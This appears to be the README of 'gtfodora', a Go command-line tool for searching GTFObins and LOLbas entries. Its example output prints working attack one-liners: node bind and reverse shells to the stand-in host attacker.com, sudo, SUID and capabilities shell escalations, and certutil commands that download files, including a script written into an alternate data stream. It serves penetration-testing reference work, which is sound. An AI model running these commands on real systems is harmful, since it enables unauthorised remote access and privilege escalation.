# Gtfodora
Explorer for GTFObins and LOLbas content.

The main purpose of this small tool is to give a CLI interface to the amazing [GTFObins](https://gtfobins.github.io/) and [LOLbas](https://lolbas-project.github.io/) projects.

The way `gtfodora` accomplishes this is quite dumb, it clones the repositories for the two sites and parses the `.yml` files, similarly to what the static site generator does.

## Disclaimer

I used this project to learn GO, or at least to get started with it. The code is probably bad, and there are several improvements that can be made. Please be forgiving and feel free to open PRs.

## Usage

```bash
Usage of ./gtfodora:
  -clone-path string
    	The path in which to clone the gtfobin and lolbas repos, defaults to "/tmp" (default ".")
  -f string
    	Filter the search only for the specified function
  -list-all
    	List all the binaries in the collection
  -list-functions
    	List the functions for the binaries
  -s string
    	Search for the binary specified and prints its details
  -unix
    	Filter the search among only unix binaries (i.e., gtfobin)
  -win
    	Filter the search among only windows binaries (i.e, lolbas)
```

The `-clone-path` defaults to `/tmp` and represents the directory in which the repositories will be cloned.
The `-list-all` and `-list-functions` print, respectively, all the binaries (both Unix and Windows) and all the functions that are available (i.e., "Download File" or "Execute").
The `-unix` and `-win` switches can be used together with all the other commands and will filter the results for GTFObins or LOLbas only, respectively.
The `-s` and `-f` can be used to search for specific binaries (-s), binaries that allow a certain function (-f) or to get the information on how a function is performed by a specific binary (combined).

## Examples

List all the functions for GTFObins:

```bash
./gtfodora -clone-path . -list-functions -unix
Functions available:
	Shell
	FileUpload
	FileDownload
	FileWrite
	FileRead
	LibraryLoad
	Sudo
	NonInteractiveReverseShell
	Command
	BindShell
	SUID
	LimitedSUID
	ReverseShell
	NonInteractiveBindShell
	Capabilities
```

Search for all the binaries that can perform the 'BindShell' function:

```bash
./gtfodora -f BindShell          
List of all the binaries with function BindShell:
nc
node
socat
```

Get the details of how a binary can accomplish the BindShell function:

```bash
./gtfodora -f BindShell -s node
The binary node allows to perform function BindShell.
Description:

Run `nc target.com 12345` on the attacker box to connect to the shell.
Code:

export LPORT=12345
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(process.env.LPORT);'
```

Get all the details about a specific binary:

```bash
./gtfodora -s node             
Information about: node
--------------------------------
Shell:
- Code:
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'

--------------------------------
Sudo:
- Code:
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'

--------------------------------
Bind Shell:
- Description:
Run `nc target.com 12345` on the attacker box to connect to the shell.
- Code:
export LPORT=12345
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(process.env.LPORT);'

--------------------------------
SUID:
- Code:
./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'

--------------------------------
Reverse Shell:
- Description:
Run `nc -l -p 12345` on the attacker box to receive the shell.
- Code:
export RHOST=attacker.com
export RPORT=12345
node -e 'sh = require("child_process").spawn("/bin/sh");
net.connect(process.env.RPORT, process.env.RHOST, function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
});'

--------------------------------
Capabilities:
- Code:
./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
```

Do the same, for a Windows binary: 

```bash
./gtfodora -s Certutil.exe
Information about: Certutil.exe
--------------------------------
Download:
- Description:
Download and save 7zip to disk in the current folder.
- Code:
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
--------------------------------
Download:
- Description:
Download and save 7zip to disk in the current folder.
- Code:
certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
--------------------------------
ADS:
- Description:
Download and save a PS1 file to an Alternate Data Stream (ADS).
- Code:
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
--------------------------------
Encode:
- Description:
Command to encode a file using Base64
- Code:
certutil -encode inputFileName encodedOutputFileName
--------------------------------
Decode:
- Description:
Command to decode a Base64 encoded file.
- Code:
certutil -decode encodedInputFileName decodedOutputFileName
```
